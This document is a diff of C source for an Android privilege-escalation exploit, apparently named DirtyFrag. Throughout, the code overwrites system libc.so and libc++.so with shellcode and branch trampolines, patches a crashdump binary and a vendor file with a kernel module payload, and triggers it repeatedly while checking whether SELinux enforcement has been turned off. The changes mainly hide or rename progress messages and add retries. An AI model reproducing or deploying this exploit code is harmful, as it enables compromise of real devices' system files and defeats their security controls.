@@ -442,7 +442,7 @@ static int patch_file(const char *path, char *addr, size_t len, size_t foff, int
     }
     LOGI("installed %zu xfrm SAs", len / 4);
     LOGD("patch at offset %zu", foff);
-    REPORTLN("patch at offset %zu", foff);
+    //REPORTLN("patch at offset %zu", foff);
 
     for (int i = 0; i < len / 4; i++) {
         uint32_t spi = beginspi + i;
@@ -459,7 +459,8 @@ static int patch_file(const char *path, char *addr, size_t len, size_t foff, int
         }
     }
     LOGI("wrote %d bytes to %s starting at 0x%x", len, path, foff);
-    REPORTLN("\nwrote %d bytes to %s starting at 0x%x", len, path, foff);
+    //REPORTLN("\nwrote %d bytes to %s starting at 0x%x", len, path, foff);
+    REPORTLN("patched %zu bytes", len);
     // not close, hold it
     // LOGD("leaked fd %d", file_fd);
     close(file_fd);
@@ -490,7 +491,7 @@ int patch_libc(struct Reporter *reporter) {
     }
 
     LOGD("hook libc offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage2_len);
-    REPORTLN("hook libc offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage2_len);
+    // REPORTLN("hook libc offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage2_len);
 
     // Aarch64 branch
     const uint32_t BRANCH = 0x14000000;
@@ -500,11 +501,11 @@ int patch_libc(struct Reporter *reporter) {
     uint32_t start_offset = (char*)stage2_start - (char*)stage2_data;
     size_t offs = shellcode_offset + start_offset - hook_offset;
     LOGI("jump off %lx", offs);
-    REPORTLN("jump off %lx", offs);
+    // REPORTLN("jump off %lx", offs);
     hook_data |= ((offs) >> 2) & ((1 << 26) - 1);
     int hook_data_size = 4;
     LOGI("hook insn: %x", hook_data);
-    REPORTLN("hook insn: %x", hook_data);
+    // REPORTLN("hook insn: %x", hook_data);
 
     // Jump back to hook target + 4.
     uint32_t jmpback = BRANCH;
@@ -517,7 +518,7 @@ int patch_libc(struct Reporter *reporter) {
 
     size_t foff = shellcode_offset;
 
-    REPORTLN("patching shellcode");
+    REPORTLN("* patch #3");
     ret = patch_file("/system/lib64/libc.so", stage2_data, stage2_len, foff, 0xDEADBE10, 0, reporter);
     if (ret) {
         LOGE("patch shellcode err %d", ret);
@@ -525,7 +526,7 @@ int patch_libc(struct Reporter *reporter) {
         return ret;
     }
 
-    REPORTLN("patching trampoline");
+    REPORTLN("* patch #4");
     ret = patch_file("/system/lib64/libc.so", (char*) &hook_data, sizeof(hook_data), hook_offset, 0xDEADBCCC, 0, reporter);
     if (ret) {
         REPORTLN("patching trampoline err %d", ret);
@@ -547,7 +548,7 @@ int patch_cxx(int run_index, struct Reporter *reporter) {
     }
 
     LOGD("hook offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage1_len);
-    REPORTLN("hook offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage1_len);
+    // REPORTLN("hook offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage1_len);
 
     // Aarch64 branch
     const uint32_t BRANCH = 0x14000000;
@@ -557,11 +558,11 @@ int patch_cxx(int run_index, struct Reporter *reporter) {
     uint32_t start_offset = (char*)stage1_start - (char*)stage1_data;
     size_t offs = shellcode_offset + start_offset - hook_offset;
     LOGI("jump off %lx", offs);
-    REPORTLN("jump off %lx", offs);
+    //REPORTLN("jump off %lx", offs);
     hook_data |= ((offs) >> 2) & ((1 << 26) - 1);
     int hook_data_size = 4;
     LOGI("hook insn: %x", hook_data);
-    REPORTLN("hook insn: %x", hook_data);
+    //REPORTLN("hook insn: %x", hook_data);
 
     //sprintf(stage1_filename, "/dev/.dirtypipe-%04d", run_index);
     //LOGI("Stage1 debug filename: %s", stage1_filename);
@@ -574,12 +575,12 @@ int patch_cxx(int run_index, struct Reporter *reporter) {
 
     *(uint32_t *)&stage1_first_inst_copy[0] = first_insn;
 
-    REPORTLN("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);
+    //REPORTLN("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);
 
     size_t foff = shellcode_offset;
 
     LOGI("patching libc++ shellcode");
-    REPORTLN("patching libc++ shellcode");
+    REPORTLN("patch #5");
     ret = patch_file("/system/lib64/libc++.so", stage1_data, stage1_len, foff, 0xDEADBE10, 0, reporter);
     if (ret) {
         REPORTLN("patch libc++ shellcode err %d", ret);
@@ -587,8 +588,8 @@ int patch_cxx(int run_index, struct Reporter *reporter) {
         return ret;
     }
 
+    REPORTLN("patch #6");
     LOGI("patching libc++ trampoline");
-    REPORTLN("patching libc++ trampoline");
     ret = patch_file("/system/lib64/libc++.so", (char*) &hook_data, sizeof(hook_data), hook_offset, 0xDEADBCCC, 0, reporter);
     if (ret) {
         REPORTLN("patch libc++ trampoline err %d", ret);
@@ -627,24 +628,27 @@ int patch_ko(struct Reporter *reporter) {
     size_t len = splice_helper_end - splice_helper_start;
     // "/vendor/lib/libstagefright_soft_g711dec.so"
     LOGD("patching crashdump");
-    REPORTLN("patching crashdump");
+    REPORTLN("* patch #1");
     int ret =
     patch_file(kCrashDump, splice_helper_start, len, 0, 0xdead0000, 0, reporter);
 
     LOGD("patch crashdump ret %d", ret);
-    REPORTLN("patch crashdump ret %d", ret);
-    if (ret)
+    if (ret) {
+        REPORTLN("patch #1 ret %d", ret);
         return ret;
+    }
 
     len = dirtyfrag_ko_end - dirtyfrag_ko_start;
 
     LOGD("patching vendorfile");
-    REPORTLN("patching vendorfile");
+    REPORTLN("* patching #2");
     ret = patch_file("[vendorfile]", dirtyfrag_ko_start , len, 0, 0xdead0000, 1, reporter);
         // patch_file("", buf, sizeof(buf), 0, 0xdead0000, 1);
 
     LOGD("patch2 ret %d", ret);
-    REPORTLN("patch2 ret %d", ret);
+    if (ret) {
+        REPORTLN("patch #2 ret %d", ret);
+    }
 
     return ret;
 }
@@ -780,12 +784,12 @@ Java_org_lsposed_lspromise_DirtyFrag_runAll(JNIEnv *env, jobject thiz) {
     if (patch_cxx(0, reporter)) {
         return;
     }
-    for (int i = 0; i < 3; i++) {
+    for (int i = 0; i < 6; i++) {
         usleep(300000);
-        REPORTLN("trying to trigger (%d)..", i);
+        REPORTLN("* trying to trigger (%d)..", i);
         createOrphanProcess();
         usleep(300000); // 300ms
-        REPORTLN("has_mark: %d", has_mark());
+        REPORTLN("done: %d", has_mark());
         int force = getenforce();
         REPORTLN("selinux enforcing: %d", force);
         if (force == 0) return;
